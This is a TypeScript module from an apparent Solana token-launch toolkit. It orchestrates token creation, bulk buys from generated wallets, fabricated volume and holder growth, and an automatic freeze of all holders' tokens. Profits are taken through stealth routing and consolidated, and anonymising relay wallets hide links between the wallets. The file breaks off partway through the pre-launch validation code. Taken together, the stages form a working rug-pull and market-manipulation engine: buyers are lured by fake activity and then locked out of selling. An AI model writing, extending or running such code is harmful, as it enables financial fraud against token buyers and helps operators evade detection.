/**
 * Continuous Outer Controller - Orchestrates Full Token Launch Lifecycle
 *
 * This module provides a comprehensive lifecycle management system for SolAdmin
 * token launches, coordinating all stages from creation through exit and
 * consolidation.
 *
 * STAGES:
 * 1. Creation (mint + metadata) - Optional, if mint doesn't exist
 * 2. Launch (initial buy-in on chosen venue)
 * 3. Market Making (volume + holders + transactions)
 * 4. Monitoring (price tracking + holder growth)
 * 5. Freeze Management (auto-freeze all holders when ready)
 * 6. Exit (profit taking via stealth routing)
 * 7. Consolidation (sweep all funds to treasury)
 * 8. Social Promotion (off-chain activities)
 *
 * The controller ensures proper sequencing, error handling, and state
 * management across all stages with comprehensive logging and observability.
 *
 * @module
 */

import fs from 'node:fs';
import path from 'node:path';
import { Keypair } from '@solana/web3.js';
import { moduleLogger, secureInt, sleep } from '@solana-toolkit/utils';
import { fundWallet } from '@solana-toolkit/transaction-builder';
import { writeEncryptedKeystore } from '@solana-toolkit/wallet-manager';
import type { ServiceContext } from './context.js';
import {
  increaseHolders,
  runBatchSwap,
  increaseTransactions,
  freshLaunchLineage,
  freshBuyerWallets,
  readCurvePrice,
  pumpfunLaunchBuy,
  moonitLaunchBuy,
  type DexContext,
} from '@solana-toolkit/dex';
import {
  autoFreezeAllHolders,
  revokeAllAuthorities,
} from './authorities.js';
import { scanTokenHolders } from './holders.js';
import {
  createAnonymizedLaunchConfig,
  createCryptoRng,
  fundBuyersAnonymously,
  getPersistentRegistry,
  DEFAULT_ANTI_CORRELATION_CONFIG,
  type AnonymityConfig,
  type AntiCorrelationConfig,
  type PersistentWalletRegistry,
  DEFAULT_ANONYMITY_CONFIG,
} from './anonymity.js';
import { SocialPromotionManager, type SocialPromotionConfig } from './social-promotion.js';
import { startProfitPipeline } from './profit-pipeline.js';
import { createToken } from './token-creator.js';
import { retry } from '@solana-toolkit/utils';

const log = moduleLogger('lifecycle-controller');

// ---------------------------------------------------------------------------
// Types and Interfaces
// ---------------------------------------------------------------------------

/** Lifecycle stage definition. */
export type LifecycleStage =
  | 'creation'
  | 'pre-launch'
  | 'launch'
  | 'market-making'
  | 'monitoring'
  | 'freeze'
  | 'exit'
  | 'consolidation'
  | 'social-promo'
  | 'complete'
  | 'error';

/** Stage transition result. */
export interface StageResult {
  stage: LifecycleStage;
  success: boolean;
  message: string;
  data?: Record<string, unknown>;
  error?: Error;
  startTime?: number;
  endTime?: number;
  durationMs?: number;
}

/** Monitor data for price tracking and observability. */
export interface MonitorData {
  currentPrice: number;
  entryPrice: number;
  holdersCount: number;
  volume24h: bigint;
  lastUpdated: number;
  priceHistory: { timestamp: number; price: number }[];
  holderHistory: { timestamp: number; count: number }[];
}

/** Launch venue configuration. */
export type LaunchVenue = 'pumpfun' | 'moonit' | 'raydium' | 'custom';

/**
 * Full lifecycle configuration.
 * This is the primary configuration object for the lifecycle controller.
 */
export interface LifecycleConfig {
  // Token configuration
  tokenName: string;
  tokenSymbol: string;
  tokenDecimals: number;
  tokenSupplyRaw: bigint;
  metadataUri: string;
  /** Existing mint address, if already created. If not provided, will be created. */
  mint?: string;
  /** Token program to use (spl or token-2022). Default: spl */
  tokenProgram?: 'spl' | 'token-2022';
  /**
   * Create the mint inside the lifecycle (Stage 0) when `mint` is absent.
   * The creation payer is `options.treasuryFunder`.
   */
  createTokenEnabled: boolean;
  /** Keep the mint authority after creation (WARNING: less safe for holders). */
  keepMintAuthority: boolean;
  /**
   * Keep the freeze authority after creation. MUST be true whenever
   * `freezeWhenHoldersReached` is true — the freeze stage signs with the
   * mint's freeze authority, and createToken revokes it by default.
   */
  keepFreezeAuthority: boolean;
  /** Revoke the metadata update authority after creation. */
  revokeMetadataAuthority: boolean;

  // Launch configuration
  /** Venue for initial launch (pumpfun, moonit, raydium, custom). */
  launchVenue: LaunchVenue;
  /** Number of buyer wallets for initial launch. */
  buyerWalletCount: number;
  /** SOL amount in lamports per buyer wallet. */
  buyLamportsPerWallet: bigint;
  /** Slippage tolerance in basis points. */
  slippageBps: number;
  /** Whether to use Jito for transactions. */
  useJito: boolean;

  // Market making configuration
  /** Enable market making after launch. */
  mmEnabled: boolean;
  /** SOL amount in lamports for market maker buys. */
  mmBuyAmountRaw: bigint;
  /** Token amount in raw units for market maker sells. */
  mmSellAmountRaw: bigint;
  /** Interval between market maker operations in ms. */
  mmIntervalMs: number;
  /** Number of market maker rounds. */
  mmRounds: number;

  // Transaction generation configuration
  /** Enable transaction generation for volume. */
  txnGenerationEnabled: boolean;
  /** Number of transaction cycles. */
  txnCycles: number;
  /** Token amount in raw units per transaction leg. */
  txnAmountRaw: bigint;
  /** Interval between transactions in ms. */
  txnIntervalMs: number;

  // Holder targets
  /** Target number of holders before freeze. */
  targetHolders: number;
  /** Whether to auto-freeze when target holders reached. */
  freezeWhenHoldersReached: boolean;
  /** Whether to revoke all authorities after freeze. */
  revokeAuthoritiesAfterFreeze: boolean;

  // Exit configuration
  /** Enable automatic exit when conditions met. */
  exitEnabled: boolean;
  /** Multiplier for take-profit (e.g., 2.0 = 2x entry price). */
  takeProfitMultiplier: number;
  /** Fraction for stop-loss (e.g., 0.5 = 50% of entry price). */
  stopLossFraction: number;
  /** Maximum hold time in seconds before forced exit. */
  maxHoldSeconds: number;

  // Anonymity configuration
  /** Anonymity settings for all operations. */
  anonymityConfig?: Partial<AnonymityConfig>;
  /** Number of relay wallets for stealth operations. */
  relayWalletCount: number;

  // Profit pipeline configuration
  /** Whether to route profits through stealth + Jupiter. */
  routeThroughJupiter: boolean;
  /** Target CEX for final dispersion (optional). */
  targetCeX?: 'binance' | 'okx' | 'bybit' | 'bitget' | 'gate' | 'mexc';

  // Social promotion configuration
  /** Social promotion configuration. */
  socialConfig?: SocialPromotionConfig[];
  /** Enable social promotion. */
  socialPromotionEnabled: boolean;

  // Monitoring configuration
  /** Interval between monitoring checks in ms. */
  monitorIntervalMs: number;
  /** Enable verbose monitoring logging. */
  verboseMonitoring: boolean;
}

/**
 * Default lifecycle configuration with production-grade settings.
 */
export const DEFAULT_LIFECYCLE_CONFIG: Partial<LifecycleConfig> = {
  // Token defaults
  tokenDecimals: 9,
  tokenProgram: 'spl',
  // Creation defaults: freeze authority retained so the freeze stage can
  // act; mint/metadata authorities revoked per the post-launch safety lock.
  createTokenEnabled: false,
  keepMintAuthority: false,
  keepFreezeAuthority: true,
  revokeMetadataAuthority: true,

  // Launch defaults
  launchVenue: 'pumpfun',
  buyerWalletCount: 28,
  buyLamportsPerWallet: 100_000_000n, // 0.1 SOL
  slippageBps: 100,
  useJito: true,

  // Market making defaults
  mmEnabled: true,
  mmBuyAmountRaw: 50_000_000n, // 0.05 SOL
  mmSellAmountRaw: 100_000_000n, // Varies by token
  mmIntervalMs: 5_000,
  mmRounds: 10,

  // Transaction generation defaults
  txnGenerationEnabled: true,
  txnCycles: 5,
  txnAmountRaw: 10_000_000n,
  txnIntervalMs: 2_000,

  // Holder targets
  targetHolders: 100,
  freezeWhenHoldersReached: true,
  revokeAuthoritiesAfterFreeze: true,

  // Exit defaults
  exitEnabled: true,
  takeProfitMultiplier: 2.0,
  stopLossFraction: 0.5,
  maxHoldSeconds: 3600, // 1 hour

  // Anonymity defaults
  anonymityConfig: DEFAULT_ANONYMITY_CONFIG,
  relayWalletCount: 5,

  // Profit pipeline defaults
  routeThroughJupiter: true,

  // Social promotion defaults
  socialPromotionEnabled: true,

  // Monitoring defaults
  monitorIntervalMs: 10_000,
  verboseMonitoring: true,
};

/**
 * Continuous lifecycle (outer loop) options.
 *
 * By default `start()` runs a single pass and returns. With `enabled: true`
 * the controller loops: each iteration is a complete launch lifecycle, after
 * which the controller waits `restartDelayMs` and runs a fresh one (fresh
 * mint when creation is enabled, fresh lineage always) until `maxRestarts`
 * is exhausted or `stop()` is called.
 */
export interface ContinuousLifecycleOptions {
  /** Run the lifecycle loop instead of a single pass (default: false). */
  enabled?: boolean;
  /** Delay between lifecycle iterations in ms (default: 30_000). */
  restartDelayMs?: number;
  /** Upper bound for the inter-launch sleep. When set, the delay is uniform in [restartDelayMs, restartDelayMaxMs]. */
  restartDelayMaxMs?: number;
  /**
   * Maximum number of restarts per start() call. 0 means unlimited
   * (default: 0). The initial pass is not counted as a restart.
   */
  maxRestarts?: number;
  /** Restart even after a successful iteration (default: false — restart
   *  only on failure). */
  restartOnSuccess?: boolean;
}

/**
 * Lifecycle controller options.
 */
export interface LifecycleControllerOptions {
  /** Service or Dex context for operations. */
  ctx: ServiceContext | DexContext;
  /** Lifecycle configuration. */
  config: LifecycleConfig;
  /** Whether to run in dry-run mode (simulate all operations). */
  dryRun?: boolean;
  /** Custom anonymity configuration override. */
  anonymityConfig?: AnonymityConfig;
  /**
   * Anti-correlation overrides (CSPRNG draws, relay-mediated funding,
   * persistent reuse registry). Defaults from DEFAULT_ANTI_CORRELATION_CONFIG.
   */
  antiCorrelationConfig?: Partial<AntiCorrelationConfig>;
  /**
   * Location of the persistent wallet reuse registry (cross-launch address
   * reuse detection). When unset and keystoreDir is configured, the registry
   * defaults to `<keystoreDir>/wallet-registry.json`.
   */
  walletRegistryPath?: string;
  /**
   * Persistent root wallet that tops up every fresh (rotated) treasury before
   * its buyers are funded. Fresh treasuries start at zero SOL; without a
   * funder, execute-mode funding transfers all fail. Simulation mode works
   * without it.
   */
  treasuryFunder?: Keypair;
  /**
   * Directory under which every launch's generated wallets (treasury,
   * buyers, relays, MM/txn wallets) are persisted as encrypted keystores.
   * Each launch gets its own subdirectory so keys never mix across launches.
   */
  keystoreDir?: string;
  /** Keystore encryption password (convention: SOLADMIN_KEYSTORE_PASSWORD). */
  keystorePassword?: string;
  /**
   * Refuse to generate wallets when keystoreDir or password is missing.
   * Defaults to true outside dry-run.
   */
  requireKeyPersistence?: boolean;
  /**
   * Wallet holding realized SOL profits; used as the profit-pipeline source
   * in the exit stage. When omitted the exit stage uses a simulated 1 SOL
   * placeholder and logs a warning.
   */
  profitWallet?: Keypair;
  /**
   * The mint's actual freeze authority keypair, required for the freeze
   * stage to succeed. When the controller creates the mint itself with
   * `keepFreezeAuthority: true`, the creation payer (treasuryFunder) IS the
   * retained freeze authority and is wired automatically — this option is
   * only needed for externally created mints.
   */
  freezeAuthority?: Keypair;
  /**
   * Continuous (outer loop) configuration. Omitted: single pass, preserving
   * the original start() contract.
   */
  continuous?: ContinuousLifecycleOptions;
}

/**
 * Complete lifecycle result.
 */
export interface LifecycleResult {
  /** All stage results. */
  stages: StageResult[];
  /** Current stage. */
  currentStage: LifecycleStage;
  /** Whether the lifecycle completed successfully. */
  success: boolean;
  /** Start timestamp. */
  startTime: number;
  /** End timestamp. */
  endTime: number;
  /** Total duration in ms. */
  durationMs: number;
  /** Monitor data from monitoring stage. */
  monitorData?: MonitorData;
  /** All errors encountered. */
  errors: Error[];
  /** Final mint address (created or provided). */
  mintAddress?: string;
}

// ---------------------------------------------------------------------------
// Lifecycle Controller Class
// ---------------------------------------------------------------------------

/**
 * Continuous lifecycle controller for token launches.
 *
 * This class orchestrates the complete token launch lifecycle, managing
 * state transitions, error handling, and coordination between all stages.
 * It provides comprehensive logging, observability, and control over the
 * entire launch process.
 *
 * USAGE:
 * ```typescript
 * const controller = new LifecycleController({
 *   ctx: myServiceContext,
 *   config: myLifecycleConfig,
 * });
 * 
 * const result = await controller.start();
 * console.log(result.success ? 'Launch completed!' : 'Launch failed');
 * ```
 */
export class LifecycleController {
  private ctx: ServiceContext | DexContext;
  private config: LifecycleConfig;
  private options: LifecycleControllerOptions;
  private currentStage: LifecycleStage = 'creation';
  private results: StageResult[] = [];
  private monitorData: MonitorData | null = null;
  private startedAt: number = 0;
  private socialManager: SocialPromotionManager;
  private running: boolean = false;
  private stopped: boolean = false;
  private errors: Error[] = [];
  private mintAddress: string | undefined;

  // --- Anti-correlation / persistence state (Gaps 3+5) ---
  /** Persistent cross-launch wallet reuse registry (null when disabled). */
  private walletRegistry: PersistentWalletRegistry | null = null;
  /** Launch lineage generated (and persisted) in pre-launch, reused by launch. */
  private launchLineage: {
    treasury: Keypair;
    buyers: Keypair[];
    relays: Keypair[];
  } | null = null;
  /**
   * Freeze authority recorded when the controller created the mint with
   * `keepFreezeAuthority: true` (the creation payer). Auto-wires the freeze
   * stage without requiring options.freezeAuthority for internal creations.
   */
  private createdFreezeAuthority: Keypair | null = null;
  /** Cached bonding-curve creator so PumpSwap pricing survives curve-account closure. */
  private curveCreator: string | undefined;

  // --- Price telemetry state (Gap 2) ---
  /** Background price poll timer (unref'd; never holds the process open). */
  private pricePollTimer: ReturnType<typeof setInterval> | null = null;

  // --- Outer loop state (Gap 4) ---
  /** Number of completed lifecycle iterations in the current start() call. */
  private iterations = 0;

  constructor(options: LifecycleControllerOptions) {
    this.ctx = options.ctx;
    this.options = options;
    this.config = {
      ...DEFAULT_LIFECYCLE_CONFIG,
      ...options.config,
    } as LifecycleConfig;

    // Initialize social promotion manager
    this.socialManager = new SocialPromotionManager(
      this.config.socialConfig ?? [],
      {
        tokenSymbol: this.config.tokenSymbol,
        tokenName: this.config.tokenName,
      },
    );

    // Initialize mint address
    this.mintAddress = this.config.mint;

    log.info(
      { token: this.config.tokenSymbol, venue: this.config.launchVenue },
      'lifecycle controller initialized',
    );
  }

  /**
   * Resolved anonymity configuration: defaults merged with any partial
   * overrides from options or the lifecycle config.
   */
  private get anonymity(): AnonymityConfig {
    return {
      ...DEFAULT_ANONYMITY_CONFIG,
      ...(this.options.anonymityConfig ?? this.config.anonymityConfig ?? {}),
    };
  }

  /**
   * Resolved anti-correlation configuration (CSPRNG draws, relay-mediated
   * funding with distinct feePayers, persistent reuse registry).
   */
  private get antiCorrelation(): AntiCorrelationConfig {
    return {
      ...DEFAULT_ANTI_CORRELATION_CONFIG,
      ...(this.options.antiCorrelationConfig ?? {}),
    };
  }

  /**
   * The persistent wallet reuse registry, lazily created at the path from
   * options.walletRegistryPath (defaulting under keystoreDir). Null when
   * persistence is disabled — callers must null-check.
   */
  private get registry(): PersistentWalletRegistry | null {
    if (this.walletRegistry) return this.walletRegistry;
    const ac = this.antiCorrelation;
    if (!ac.persistRegistry) return null;
    const registryPath =
      this.options.walletRegistryPath ??
      (this.options.keystoreDir
        ? path.join(this.options.keystoreDir, 'wallet-registry.json')
        : null);
    if (!registryPath) {
      log.warn('persistRegistry enabled but no registry path resolvable — reuse detection disabled');
      return null;
    }
    this.walletRegistry = getPersistentRegistry(registryPath, ac.maxWalletAgeMs);
    return this.walletRegistry;
  }

  /**
   * Effective freeze authority for the freeze stage: the explicitly
   * configured keypair when provided, otherwise the authority the creation
   * stage retained when it created the mint itself (the creation payer).
   */
  private get effectiveFreezeAuthority(): Keypair | undefined {
    return this.options.freezeAuthority ?? this.createdFreezeAuthority ?? undefined;
  }

  /**
   * Tops up a fresh rotated treasury from the persistent root wallet
   * (`options.treasuryFunder`). Fresh treasuries start at zero SOL — without
   * this step every downstream buyer-funding transfer fails in execute mode.
   * Returns false (and logs) when no funder is configured; simulation mode
   * tolerates that, execute mode does not.
   */
  private async fundTreasury(treasury: Keypair, lamports: bigint): Promise<boolean> {
    const funder = this.options.treasuryFunder;
    if (!funder) {
      log.warn(
        { treasury: treasury.publicKey.toBase58().slice(0, 6) },
        'no treasuryFunder configured — fresh treasury is UNFUNDED; execute-mode funding will fail',
      );
      return false;
    }
    await fundWallet(this.ctx, {
      funder,
      destination: treasury.publicKey,
      lamports,
      mode: this.options.dryRun ? 'simulate' : 'execute',
    });
    log.info(
      { treasury: treasury.publicKey.toBase58().slice(0, 6), lamports: lamports.toString() },
      'fresh treasury funded from root wallet',
    );
    return true;
  }

  /**
   * Persists generated keypairs for ONE launch under
   * `<keystoreDir>/<tokenSymbol>-<startedAt>/` before any wallet is funded.
   *
   * FAIL-CLOSED: a persistence error aborts the stage — losing the key of a
   * wallet that is about to hold funds is unrecoverable, while regenerating
   * an unfunded wallet costs nothing. When keystoreDir (or password) is not
   * configured the wallets stay transient and a warning is logged — same as
   * the pre-persistence behavior.
   *
   * Recovery: each launch directory carries a manifest.json (label, role,
   * publicKey, file) so interrupted launches can be reloaded with
   * loadKeystore / loadBatchWallets instead of abandoning funded wallets.
   */
  private persistLineage(role: string, wallets: Keypair[]): string[] {
    const dir = this.options.keystoreDir;
    const password = this.options.keystorePassword ?? process.env['SOLADMIN_KEYSTORE_PASSWORD'];
    const requirePersist = this.options.requireKeyPersistence ?? !this.options.dryRun;
    if (!dir || !password) {
      if (requirePersist) {
        throw new Error('keystoreDir and SOLADMIN_KEYSTORE_PASSWORD are required before funding wallets');
      }
      log.warn('keystoreDir/password not set — generated wallets are TRANSIENT (lost on process exit)');
      return [];
    }
    const launchDir = path.join(dir, `${this.config.tokenSymbol}-${this.startedAt}`);
    fs.mkdirSync(launchDir, { recursive: true });
    const files: string[] = [];
    const manifest: { label: string; publicKey: string; file: string; role: string }[] = [];
    for (const [i, kp] of wallets.entries()) {
      const label = `${role}-${i + 1}`;
      const file = path.join(launchDir, `${label}.keystore.json`);
      writeEncryptedKeystore(kp, password, file, label);
      files.push(file);
      manifest.push({ label, publicKey: kp.publicKey.toBase58(), file, role });
    }
    const manifestFile = path.join(launchDir, 'manifest.json');
    const existing = fs.existsSync(manifestFile)
      ? (JSON.parse(fs.readFileSync(manifestFile, 'utf8')) as { wallets: typeof manifest })
      : { wallets: [] };
    fs.writeFileSync(
      manifestFile,
      JSON.stringify({
        tokenSymbol: this.config.tokenSymbol,
        createdAt: new Date().toISOString(),
        mint: this.mintAddress ?? null,
        wallets: [...existing.wallets, ...manifest],
      }, null, 2),
      'utf8',
    );
    log.info({ role, count: wallets.length, launchDir }, 'launch wallets persisted');
    return files;
  }

  /**
   * Best-effort price refresh via the pull-based reader (ctx.rpc, so the
   * call rides the failover pool). Telemetry failure never fails a stage —
   * the last good price stays and triggers fall back to the timeout/holder
   * conditions.
   */
  private async refreshPrice(): Promise<void> {
    if (!this.monitorData) return;
    const mint = this.mintAddress || this.config.mint;
    if (!mint) return;
    try {
      const snap = await retry(
        () => readCurvePrice(this.ctx as unknown as DexContext, mint, this.curveCreator),
        { retries: 2, backoffMs: 400, label: 'curve-price' },
      );
      if (snap?.creator) this.curveCreator = snap.creator;
      if (snap && snap.priceSolPerToken > 0) {
        this.monitorData.currentPrice = snap.priceSolPerToken;
        this.monitorData.lastUpdated = Date.now();
        this.monitorData.priceHistory.push({
          timestamp: Date.now(),
          price: snap.priceSolPerToken,
        });
        // Cap history so long monitoring loops don't grow unbounded.
        if (this.monitorData.priceHistory.length > 1_000) {
          this.monitorData.priceHistory.shift();
        }
      }
    } catch (err) {
      log.warn({ err }, 'price refresh failed — keeping last price (RPC failover will rotate)');
    }
  }

  /**
   * Starts the background price poller (Gap 2 telemetry).
   *
   * `executeMonitoring` already refreshes the price on its own tick, but
   * only while the monitoring stage is active: during launch, market-making
   * and txn generation the monitor data goes stale, and the stale-price
   * guard in `checkExitConditions` then sidelines take-profit/stop-loss.
   * This poller keeps `monitorData` fresh across ALL post-launch stages so
   * exit triggers react to real venue data whenever they are evaluated.
   *
   * Every tick goes through `refreshPrice` → `ctx.rpc` → the failover pool,
   * so an endpoint outage rotates instead of killing the poller. The timer
   * is unref'd: it never keeps the process alive on its own.
   */
  private startPricePolling(): void {
    if (this.pricePollTimer) return;
    const mint = this.mintAddress || this.config.mint;
    if (!mint) {
      log.warn('price polling not started: no mint address available');
      return;
    }
    const intervalMs = Math.max(1_000, this.config.monitorIntervalMs || 10_000);
    const tick = () => {
      void this.refreshPrice().catch((err) => {
        log.warn({ err }, 'price poll tick failed');
      });
    };
    tick();
    const timer = setInterval(tick, intervalMs);
    // Never hold the event loop open just for telemetry.
    (timer as { unref?: () => void }).unref?.();
    this.pricePollTimer = timer;
    log.info({ mint, intervalMs }, 'background price polling started');
  }

  /** Stops the background price poller (idempotent). */
  private stopPricePolling(): void {
    if (!this.pricePollTimer) return;
    clearInterval(this.pricePollTimer);
    this.pricePollTimer = null;
    log.info('background price polling stopped');
  }

  /**
   * Start the lifecycle execution.
   *
   * Single-pass mode (default): runs all stages once and returns — the
   * original contract, preserved for every existing caller.
   *
   * Continuous mode (`options.continuous.enabled`): outer loop. Each
   * iteration is a COMPLETE launch lifecycle (fresh mint when creation is
   * enabled, fresh persisted lineage always); after each iteration the
   * controller waits `restartDelayMs` and runs the next, until `maxRestarts`
   * is exhausted, `stop()` is called, or an iteration succeeded with
   * `restartOnSuccess` false (the default — only failed launches restart).
   *
   * @returns Complete lifecycle result (last iteration in continuous mode)
   */
  async start(): Promise<LifecycleResult> {
    if (this.running) {
      throw new Error('Lifecycle already running');
    }

    this.running = true;
    this.stopped = false;
    this.startedAt = Date.now();
    this.iterations = 0;

    const cont = this.options.continuous;
    const isContinuous = cont?.enabled === true;
    const restartDelayMs = cont?.restartDelayMs ?? 30_000;
    const restartDelayMaxMs = cont?.restartDelayMaxMs ?? restartDelayMs;
    const maxRestarts = cont?.maxRestarts ?? 0; // 0 = unlimited
    const restartOnSuccess = cont?.restartOnSuccess ?? false;

    if (isContinuous) {
      log.info(
        { restartDelayMs, maxRestarts, restartOnSuccess },
        'continuous lifecycle mode enabled — outer loop active',
      );
    }

    try {
      let result = await this.runOnce();

      if (!isContinuous) {
        return result;
      }

      // Outer loop: keep launching until stopped, out of restarts, or a
      // successful iteration (when restartOnSuccess is false).
      let restarts = 0;
      while (!this.stopped) {
        const shouldRestart = restartOnSuccess || !result.success;
        if (!shouldRestart) {
          log.info('iteration succeeded and restartOnSuccess is false — outer loop exiting');
          break;
        }
        if (maxRestarts > 0 && restarts >= maxRestarts) {
          log.info({ restarts, maxRestarts }, 'maximum restarts reached — outer loop exiting');
          break;
        }
        restarts++;
        log.info(
          { nextIteration: this.iterations + 1, delayMs: restartDelayMs, lastSuccess: result.success },
          'outer loop: preparing next lifecycle iteration',
        );
        await sleep(secureInt(restartDelayMs, Math.max(restartDelayMs, restartDelayMaxMs)));
        if (this.stopped) break;
        result = await this.runOnce();
      }

      return result;

    } catch (err) {
      const error = err instanceof Error ? err : new Error(String(err));
      this.errors.push(error);
      this.currentStage = 'error';

      log.error(
        { err: error, stage: this.currentStage },
        'lifecycle failed',
      );

      return this.buildResult();

    } finally {
      this.running = false;
      this.stopPricePolling();
    }
  }

  /**
   * Resets per-iteration state and runs one complete lifecycle pass.
   * Each iteration is an isolated launch: fresh results/errors/monitor
   * data, fresh lineage, and a fresh mint whenever the controller is
   * responsible for creation (an explicitly configured mint is reused).
   */
  private async runOnce(): Promise<LifecycleResult> {
    this.resetForIteration();
    this.iterations++;
    log.info(
      { token: this.config.tokenSymbol, dryRun: this.options.dryRun, iteration: this.iterations },
      'lifecycle iteration started',
    );

    try {
      // Stage 0: Creation (idempotent — skips when the mint exists or is disabled)
      await this.runStage('creation', this.executeCreation.bind(this));

      // Stage 1: Pre-launch setup (validation, wallet generation)
      await this.runStage('pre-launch', this.executePreLaunch.bind(this));

      // Stage 2: Launch (initial buy-in)
      await this.runStage('launch', this.executeLaunch.bind(this));

      // Stage 3: Market Making (volume + holders)
      if (this.config.mmEnabled) {
        await this.runStage('market-making', this.executeMarketMaking.bind(this));
      }

      // Stage 4: Transaction Generation
      if (this.config.txnGenerationEnabled) {
        await this.runStage('market-making', this.executeTransactionGeneration.bind(this));
      }

      // Stage 5: Monitoring (continuous until exit conditions met)
      await this.runStage('monitoring', this.executeMonitoring.bind(this));

      // Stage 6: Freeze Management (if conditions met)
      if (this.config.freezeWhenHoldersReached) {
        await this.runStage('freeze', this.executeFreeze.bind(this));
      }

      // Stage 7: Social Promotion
      if (this.config.socialPromotionEnabled) {
        await this.runStage('social-promo', this.executeSocialPromotion.bind(this));
      }

      // Stage 8: Exit (if conditions met)
      if (this.config.exitEnabled) {
        await this.runStage('exit', this.executeExit.bind(this));
      }

      // Stage 9: Consolidation
      await this.runStage('consolidation', this.executeConsolidation.bind(this));

      // The lifecycle pass is over: the price poller has nothing left to feed.
      this.stopPricePolling();

      this.currentStage = 'complete';
      log.info(
        { results: this.results.length, durationMs: Date.now() - this.startedAt, iteration: this.iterations },
        'lifecycle iteration completed successfully',
      );

      return this.buildResult();

    } catch (err) {
      const error = err instanceof Error ? err : new Error(String(err));
      this.currentStage = 'error';

      log.error(
        { err: error, stage: this.currentStage, iteration: this.iterations },
        'lifecycle iteration failed',
      );

      return this.buildResult();
    }
  }

  /**
   * Resets all per-iteration state so the next iteration starts clean:
   * fresh stage results, fresh monitor data (entry price re-captured at the
   * next launch), fresh lineage, and a fresh mint when the controller
   * creates it. An explicitly configured `config.mint` is reused as-is.
   */
  private resetForIteration(): void {
    this.results = [];
    this.errors = [];
    this.currentStage = 'creation';
    this.monitorData = null;
    this.stopPricePolling();
    this.launchLineage = null;
    this.curveCreator = undefined;
    this.startedAt = Date.now();
    if (this.config.createTokenEnabled) {
      this.mintAddress = undefined;
      this.createdFreezeAuthority = null;
    } else {
      this.mintAddress = this.config.mint;
    }
  }

  /**
   * Stop the lifecycle execution gracefully.
   * Stops at the next stage boundary and halts the continuous outer loop
   * at the next iteration boundary.
   */
  stop(): void {
    log.info('lifecycle stop requested');
    this.stopped = true;
    this.stopPricePolling();
  }

  /**
   * Execute a single stage with timing and error handling.
   */
  private async runStage(
    stage: LifecycleStage,
    fn: () => Promise<StageResult>,
  ): Promise<void> {
    if (this.stopped) {
      throw new Error('Lifecycle stopped by user request');
    }

    this.currentStage = stage;
    const startTime = Date.now();

    log.info({ stage }, 'stage starting');

    try {
      const result = await fn();
      const endTime = Date.now();

      // Update result with timing
      result.startTime = startTime;
      result.endTime = endTime;
      result.durationMs = endTime - startTime;

      this.results.push(result);

      if (!result.success) {
        throw new Error(result.message);
      }

      log.info(
        { stage, durationMs: result.durationMs, data: result.data },
        'stage completed',
      );

    } catch (err) {
      const error = err instanceof Error ? err : new Error(String(err));
      this.errors.push(error);

      const errorResult: StageResult = {
        stage,
        success: false,
        message: `Stage ${stage} failed: ${error.message}`,
        error,
        startTime,
        endTime: Date.now(),
        durationMs: Date.now() - startTime,
      };

      this.results.push(errorResult);
      log.error({ stage, err: error }, 'stage failed');
      throw error;
    }
  }

  /**
   * Build the complete lifecycle result.
   */
  private buildResult(): LifecycleResult {
    return {
      stages: this.results,
      currentStage: this.currentStage,
      success: this.currentStage === 'complete' && this.errors.length === 0,
      startTime: this.startedAt,
      endTime: Date.now(),
      durationMs: Date.now() - this.startedAt,
      monitorData: this.monitorData ?? undefined,
      errors: this.errors,
      mintAddress: this.mintAddress,
    };
  }

  // ---------------------------------------------------------------------------
  // Stage Implementations
  // ---------------------------------------------------------------------------

  /**
   * Stage 0: Token creation.
   * Deploys the mint inside the lifecycle (idempotent — skipped when the
   * mint already exists or creation is disabled). The persistent root wallet
   * (treasuryFunder) pays mint rent and metadata fees; the same keypair is
   * the retained freeze authority, which is what later lets the freeze
   * stage (autoFreezeAllHolders) actually authorize freezes.
   */
  private async executeCreation(): Promise<StageResult> {
    if (this.mintAddress) {
      return {
        stage: 'creation',
        success: true,
        message: `Mint provided externally: ${this.mintAddress}`,
        data: { mint: this.mintAddress },
      };
    }
    const venue = this.config.launchVenue;
    if (venue === 'pumpfun' || venue === 'moonit') {
      return {
        stage: 'creation',
        success: true,
        message: `Mint deferred to ${venue} launch (venue program creates the mint)`,
        data: { deferred: true, venue },
      };
    }
    if (!this.config.createTokenEnabled) {
      return {
        stage: 'creation',
        success: true,
        message: 'Creation disabled and no mint provided — launch stage will fail without one',
        data: {},
      };
    }
    if (!this.options.treasuryFunder) {
      return {
        stage: 'creation',
        success: false,
        message: 'Creation requires options.treasuryFunder (pays mint rent + metadata fees)',
      };
    }

    const report = await createToken(this.ctx, {
      payer: this.options.treasuryFunder,
      mode: this.options.dryRun ? 'simulate' : 'execute',
      metadata: {
        name: this.config.tokenName,
        symbol: this.config.tokenSymbol,
        uri: this.config.metadataUri,
      },
      decimals: this.config.tokenDecimals,
      initialSupplyRaw: this.config.tokenSupplyRaw,
      tokenProgram: this.config.tokenProgram ?? 'spl',
      keepMintAuthority: this.config.keepMintAuthority,
      keepFreezeAuthority: this.config.keepFreezeAuthority,
      revokeMetadataAuthority: this.config.revokeMetadataAuthority,
    });

    this.setMintAddress(report.mint);

    // Gap 1 wiring: when this controller created the mint and retained the
    // freeze authority, the creation payer IS that authority. Record it so
    // the freeze stage (autoFreezeAllHolders) can sign without requiring
    // the operator to pass options.freezeAuthority for internal creations.
    if (this.config.keepFreezeAuthority) {
      this.createdFreezeAuthority = this.options.treasuryFunder;
      log.info(
        { mint: report.mint, freezeAuthority: this.createdFreezeAuthority.publicKey.toBase58().slice(0, 6) },
        'freeze authority auto-wired from creation payer',
      );
    }

    // Post-creation verification through the failover pool: confirm the
    // mint account exists before launch capital moves.
    if (!this.options.dryRun) {
      const mint = await retry(
        () => this.ctx.rpc.accountInfo(report.mint),
        { retries: 5, backoffMs: 1_000, label: 'verify-mint' },
      );
      if (!mint) {
        throw new Error(`creation reported mint ${report.mint} but the account was not found on-chain`);
      }
    }

    return {
      stage: 'creation',
      success: true,
      message: `Mint created: ${report.mint}`,
      data: {
        mint: report.mint,
        keepFreezeAuthority: this.config.keepFreezeAuthority,
      },
    };
  }

  /**
   * Stage 1: Pre-launch setup.
   * Validates configuration, generates wallets, and performs setup.
   */
  private async executePreLaunch(): Promise<StageResult> {
    log.info('executing pre-launch setup');

    // Validate configuration
    const validationErrors: string[] = [];

    if (!this.config.tokenName || !this.config.tokenSymbol) {
      validationErrors.push('Token name and symbol are required');
    }

    if (!this.config.metadataUri) {
      validationErrors.push('Metadata URI is required');
    }

    if (!this.config.launchVenue) {
      validationErrors.push('Launch venue is required');
    }

    if (validationErrors.length > 0) {
      return {
        stage: 'pre-launch',
        success: false,
